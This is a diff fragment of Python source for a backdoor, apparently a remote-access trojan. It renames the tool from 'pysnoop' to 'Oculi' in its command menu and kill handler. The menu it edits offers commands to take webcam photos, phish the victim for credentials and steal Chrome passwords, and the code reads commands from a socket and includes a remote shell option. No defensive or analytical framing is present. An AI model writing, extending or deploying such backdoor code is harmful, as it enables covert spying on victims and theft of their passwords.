@@ -76,8 +76,8 @@ def startbackdoor():
      webcam ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Take a Photo through an availabe webcam
       phish ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Phish the user for their credentials
      chrome ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Steal Chrome Passwords
-       exit ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Exit pysnoop (Does not kill the program)
-       kill ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Kill pysnoop
+       exit ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Exit Oculi (Does not kill the program)
+       kill ''' + Style.BRIGHT + r'''::''' + Style.RESET_ALL + r''' Kill Oculi
 
 ''','utf-8'))
                     elif instruction == 'shell':
@@ -223,10 +223,10 @@ def startbackdoor():
                         conn.close()
                         break
                     elif instruction == 'kill':
-                        conn.send(b'Are you sure you want to kill pysnoop? [Y/N]\n > ')
+                        conn.send(b'Are you sure you want to kill Oculi? [Y/N]\n > ')
                         confirmation = conn.recv(4096).decode().strip().upper()
                         if confirmation == 'Y':
-                            conn.send(b'\n  Killing pysnoop...\n')
+                            conn.send(b'\n  Killing Oculi...\n')
                             conn.close()
                             sys.exit()
                     else: conn.send(bytes(Fore.RED + '[+] ' + Fore.RESET + 'Command not found.\n', 'utf-8'))
